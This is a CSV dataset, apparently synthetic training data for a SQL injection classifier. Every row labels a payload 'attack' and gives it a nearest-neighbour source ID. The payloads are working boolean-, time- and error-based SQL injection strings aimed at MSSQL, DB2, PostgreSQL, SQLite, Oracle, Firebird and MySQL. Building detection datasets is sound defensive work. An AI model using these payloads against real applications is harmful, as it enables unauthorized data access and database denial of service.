id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000017,attack,boolean,"1'   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'vcvj'  =  'vcvj",nearest_attack_euclidean,R001141,0.2416045385186278
SMOTE_000018,attack,boolean,"1%'   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000664,0.1825474141555895
SMOTE_000019,attack,boolean,"1""  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  ""eeye""  =  ""eeye",nearest_attack_euclidean,R001157,0.35136968102200167
SMOTE_000020,attack,boolean,"-7743"" or 9323  =  9323#",nearest_attack_euclidean,R001497,0.7476335532902442
SMOTE_000021,attack,boolean,1  )   as qgsb where 7600  =  7600 and 2006  =  2006,nearest_attack_euclidean,R000179,0.3290002552715515
SMOTE_000022,attack,boolean,"1""   )    )     )   and 7153  =  7474--",nearest_attack_euclidean,R000279,0.6740596912049981
SMOTE_000023,attack,boolean,-4900'   )    )    or 7208  =  3236,nearest_attack_euclidean,R000716,0.07194840833246854
SMOTE_000024,attack,boolean,"1""   )    )     )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""wute"" like ""wute",nearest_attack_euclidean,R001536,0.4991824947234616
SMOTE_000025,attack,boolean,"1""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""wile"" like ""wile",nearest_attack_euclidean,R001320,0.11615887462946607
SMOTE_000026,attack,boolean,select * from users where id  =  1 %  (  $  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000088,0.8183977403792704
SMOTE_000027,attack,boolean,"1""   )    )    rlike   (  select   (  case when   (  5342  =  1036  )   then 1 else 0x28 end   )    )    and    (    (   ""ntdz"" like ""ntdz",nearest_attack_euclidean,R001196,1.365389441300428
SMOTE_000028,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  'njnr'  =  'njnr",nearest_attack_euclidean,R000131,0.18306487073922348
SMOTE_000029,attack,boolean,"1   )    )    as rcon where 8190  =  8190 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000689,0.2353925208727509
SMOTE_000030,attack,boolean,"-9884'  )   or elt  (  1942  =  8409,8409  )   and   (  'tqdq' like 'tqdq",nearest_attack_euclidean,R001404,0.07400216729439953
SMOTE_000031,attack,boolean,-4669  )   or 2452  =  1601#,nearest_attack_euclidean,R000356,0.3363952849297895
SMOTE_000032,attack,boolean,1'  )   where 5280  =  5280 and 4595  =  4595#,nearest_attack_euclidean,R000617,0.8470124789337392
SMOTE_000033,attack,boolean,"1"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R001304,0.04836463841409523
SMOTE_000034,attack,boolean,"1 where 1776  =  1776 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000325,0.9394287783509125
SMOTE_000035,attack,boolean,"1'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'rfln'  =  'rfln",nearest_attack_euclidean,R000270,0.2599857176038007
SMOTE_000036,attack,boolean,1  )   as azoo where 8933  =  8933 and   (  3020  =  3020  )  *6703--,nearest_attack_euclidean,R000388,0.01642476406806667
SMOTE_000037,attack,boolean,"-7743"" or 9323  =  9323#",nearest_attack_euclidean,R001497,0.030901950362097926
SMOTE_000038,attack,boolean,1%'  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  '%'  =  ',nearest_attack_euclidean,R001454,0.5473403302396526
SMOTE_000039,attack,boolean,"1""  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""fpqh""  =  ""fpqh",nearest_attack_euclidean,R001560,0.503174697727187
SMOTE_000040,attack,boolean,"1""   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""dbxi"" like ""dbxi",nearest_attack_euclidean,R001270,0.14014411500991997
SMOTE_000041,attack,boolean,"1'+  (  select acax where 4169  =  4169 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +'",nearest_attack_euclidean,R001065,1.2674603915255775
SMOTE_000042,attack,boolean,-6813   )    )     )   or 6872  =  6872 and    (    (     (  7304  =  7304,nearest_attack_euclidean,R000775,0.27694942273555545
SMOTE_000043,attack,boolean,-5291'   )    )    or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'tmpm'  =  'tmpm,nearest_attack_euclidean,R000435,0.24970712508703286
SMOTE_000044,attack,boolean,"1%'   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   '%'  =  '",nearest_attack_euclidean,R000563,0.3532441173188323
SMOTE_000045,attack,boolean,-7293'   )    )     )   or 3038  =  3038,nearest_attack_euclidean,R000339,0.2897819464476277
SMOTE_000046,attack,boolean,"1%""  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000453,0.3873252018925311
SMOTE_000047,attack,boolean,1  )   and 2006  =  2006,nearest_attack_euclidean,R001022,1.0397673901092839
SMOTE_000048,attack,boolean,"1' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'bkcs'  =  'bkcs",nearest_attack_euclidean,R000375,0.7932315888178331
SMOTE_000049,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000837,0.10379985614825835
SMOTE_000050,attack,boolean,"1%""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R000173,1.0278367623764761
SMOTE_000051,attack,boolean,select * from users where id  =  1 %  (  $  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000088,0.0
SMOTE_000052,attack,boolean,select * from users where id  =  1.*1 or 1  =  1 -- 1,nearest_attack_euclidean,R000061,1.3097280621697207
SMOTE_000053,attack,boolean,"1%""   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R001278,0.0019750852083967214
SMOTE_000054,attack,boolean,1  )   as jvmv where 3857  =  3857 and   (  5717  =  6483  )  *6483--,nearest_attack_euclidean,R000559,0.01884408877600109
SMOTE_000055,attack,boolean,"1"" and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and ""wrbs"" like ""wrbs",nearest_attack_euclidean,R000336,0.03271251655670786
SMOTE_000056,attack,boolean,"1""  )   and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""fpqh""  =  ""fpqh",nearest_attack_euclidean,R001560,0.5009618478678154
SMOTE_000057,attack,boolean,"1""   )    )    as qrok where 8257  =  8257 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001250,0.05570146543355916
SMOTE_000058,attack,boolean,admin'  )   or   (  '1'  =  '1'--,nearest_attack_euclidean,R000067,2.016719076163068
SMOTE_000059,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (   'hxcq'  =  'hxcq",nearest_attack_euclidean,R001120,0.6804997444277844
SMOTE_000060,attack,boolean,"1  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",nearest_attack_euclidean,R001026,0.6490022542828294
SMOTE_000061,attack,boolean,1%'   )    )     )   and 7219  =  7361 and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000537,0.3331803408988296
SMOTE_000062,attack,boolean,"1   )    )    as kycl where 8008  =  8008 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000212,0.014784404509112227
SMOTE_000063,attack,boolean,"1%'   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R001059,0.010706681900915617
SMOTE_000064,attack,boolean, or 3  =  3 --,nearest_attack_euclidean,R000019,0.018941346446609834
SMOTE_000065,attack,boolean,-8625 or 3176  =  2519# fvgl,nearest_attack_euclidean,R000978,0.6834106791628787
SMOTE_000066,attack,boolean,"1""   )    )     )   rlike   (  select   (  case when   (  6915  =  4531  )   then 1 else 0x28 end   )    )    and    (    (     (  ""jzzu""  =  ""jzzu",nearest_attack_euclidean,R000862,0.18098248495621724
SMOTE_000067,attack,boolean,"1  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001008,0.7334898701789285
SMOTE_000068,attack,boolean,-6086'   )    )    or   (  6719  =  7280  )  *7280 and    (    (   'ozbj'  =  'ozbj,nearest_attack_euclidean,R001353,0.29200157041741226
SMOTE_000069,attack,boolean,"1   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   5683  =  5683",nearest_attack_euclidean,R001319,0.5746841971009328
SMOTE_000070,attack,boolean,"1""  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  ""vudj"" like ""vudj",nearest_attack_euclidean,R000538,0.8114504940598102
SMOTE_000071,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'cixa' like 'cixa",nearest_attack_euclidean,R001326,1.2626480316420519
SMOTE_000072,attack,boolean,"-1203""   )    )    or 8571  =  8571--",nearest_attack_euclidean,R000860,0.503417047306401
SMOTE_000073,attack,boolean,"1'  )   as keom where 7524  =  7524 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R000820,0.6978404629203028
SMOTE_000074,attack,boolean,"1  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  8929  =  8929",nearest_attack_euclidean,R000129,0.5759112038439099
SMOTE_000075,attack,boolean,"1   )    )    as jrzr where 5194  =  5194 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000315,0.0910902535135032
SMOTE_000076,attack,boolean,select * from users where id  =  1 or \<\. or 1  =  1 -- 1,nearest_attack_euclidean,R000040,0.21367997897846405
SMOTE_000077,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000002,1.1920928955078125e-07
SMOTE_000078,attack,boolean,-2707'   )    )     )   or   (  8459  =  8459  )  *4906 and    (    (     (  'mwdq'  =  'mwdq,nearest_attack_euclidean,R000352,0.041308632102180894
SMOTE_000079,attack,boolean,"1""   )    )     )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000835,0.19692122773566828
SMOTE_000080,attack,boolean,"1  )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000230,0.23456563190962987
SMOTE_000081,attack,boolean,"1%""   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R001151,0.4879685218333876
SMOTE_000082,attack,boolean,"1""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""wile"" like ""wile",nearest_attack_euclidean,R001320,0.0621221299456485
SMOTE_000083,attack,boolean,-8625 or 3176  =  2519# fvgl,nearest_attack_euclidean,R000978,0.6881489504567394
SMOTE_000084,attack,boolean,"1""  )   where 8571  =  8571 and elt  (  4249  =  4249,7259  )  --",nearest_attack_euclidean,R001232,0.17626687095176505
SMOTE_000085,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""nxvp""  =  ""nxvp",nearest_attack_euclidean,R000634,0.794993855071304
SMOTE_000086,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  'fwok' like 'fwok",nearest_attack_euclidean,R001431,0.2531655509058613
SMOTE_000087,attack,boolean,"1'  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  'zpzf'  =  'zpzf",nearest_attack_euclidean,R000226,0.7667752622025583
SMOTE_000088,attack,boolean,"1"" where 2394  =  2394 and 8831  =  8333--",nearest_attack_euclidean,R001397,0.9277668561787951
SMOTE_000089,attack,boolean,"1' or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000466,0.19132074919369468
SMOTE_000090,attack,boolean,select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,nearest_attack_euclidean,R000007,0.06945832051122751
SMOTE_000091,attack,boolean,"1""   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""nthu"" like ""nthu",nearest_attack_euclidean,R000789,0.6977532795965172
SMOTE_000092,attack,boolean," select * from users where id  =  1 or ""%1"" or 1  =  1 -- 1",nearest_attack_euclidean,R000116,0.09197417376402423
SMOTE_000093,attack,boolean,"1'||  (  select 'uyfo' where 1236  =  1236 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000693,0.9643596960537841
SMOTE_000094,attack,boolean,"1  )   where 8691  =  8691 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001189,0.1331426164639932
SMOTE_000095,attack,boolean,1 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  -- slje,nearest_attack_euclidean,R001003,0.6142159001449811
SMOTE_000096,attack,boolean,-4322'   )    )    as magw where 1627  =  1627 or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,nearest_attack_euclidean,R000615,0.1606531967439455
SMOTE_000097,attack,boolean,1'||  (  select 'xdzp' from dual where 5786  =  5786 and   (  3020  =  3020  )  *6703  )  ||',nearest_attack_euclidean,R000492,0.7863290471440865
SMOTE_000098,attack,boolean,hi'  )   or   (  'a'  =  'a,nearest_attack_euclidean,R000025,1.3057214648056774
SMOTE_000099,attack,boolean,"-8550""  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""kyad""  =  ""kyad",nearest_attack_euclidean,R000878,1.1480404142888576
SMOTE_000100,attack,boolean,-6030%'  )   or 3038  =  3038,nearest_attack_euclidean,R000337,0.5556108349988286
SMOTE_000101,attack,boolean,"1%' or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001350,1.131117101145777
SMOTE_000102,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R001190,0.11085029610135932
SMOTE_000103,attack,boolean,select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,nearest_attack_euclidean,R000007,0.137280266697856
SMOTE_000104,attack,boolean,"1%""   )    )     )   and   (  3502  =  7893  )  *7893 and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000983,0.1848385470239781
SMOTE_000105,attack,boolean,"1%""  )   and elt  (  4249  =  4249,7259  )   and   (  ""%""  =  """,nearest_attack_euclidean,R001368,0.7443368160679864
SMOTE_000106,attack,boolean,-4262%'   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R001531,1.2533506578998048
SMOTE_000107,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ""gjtx"" like ""gjtx",nearest_attack_euclidean,R000377,0.4599618446841618
SMOTE_000108,attack,boolean,"-1737' or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'fsmd'  =  'fsmd",nearest_attack_euclidean,R000859,0.1820169248748187
SMOTE_000109,attack,boolean,"1""  )   as fcrx where 2929  =  2929 and 2820  =  5133",nearest_attack_euclidean,R001100,1.2568249510097182
SMOTE_000110,attack,boolean,1'  )   and 7290  =  8416 and   (  'ktlz' like 'ktlz,nearest_attack_euclidean,R000455,0.2253665842444056
SMOTE_000111,attack,boolean,"1 and elt  (  3172  =  7243,7243  )  ",nearest_attack_euclidean,R001422,0.045243316230081584
SMOTE_000112,attack,boolean,"1'  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  ",nearest_attack_euclidean,R000994,0.4022483777309482
SMOTE_000113,attack,boolean,"1""   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""uzbl""  =  ""uzbl",nearest_attack_euclidean,R001200,0.8106581543853747
SMOTE_000114,attack,boolean,"1' where 9420  =  9420 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000708,0.08340883029923411
SMOTE_000115,attack,boolean,"1   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R001107,0.6292064246914987
SMOTE_000116,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   'xaoi'  =  'xaoi",nearest_attack_euclidean,R000472,1.1881884692683842
SMOTE_000117,attack,boolean,1  )   and 8417  =  5276#,nearest_attack_euclidean,R000540,0.04056704898202689
SMOTE_000118,attack,boolean,"1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'ojag'  =  'ojag",nearest_attack_euclidean,R000229,0.425688537102647
SMOTE_000119,attack,boolean,1'+  (  select bgbq where 1589  =  1589 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   +',nearest_attack_euclidean,R001094,1.3413617186408884
SMOTE_000120,attack,boolean,"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  7711  =  7711",nearest_attack_euclidean,R000927,0.2382001216237337
